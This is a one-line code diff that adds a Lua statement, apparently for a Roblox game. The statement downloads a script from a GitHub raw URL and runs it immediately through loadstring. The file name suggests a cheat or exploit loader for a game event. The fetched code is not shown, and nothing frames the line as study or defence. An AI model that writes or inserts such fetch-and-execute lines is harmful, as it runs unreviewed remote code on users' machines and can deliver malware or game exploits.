@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/event-solve-the-cube-spam3-kyfpq7tul0q5sf.lua"))()
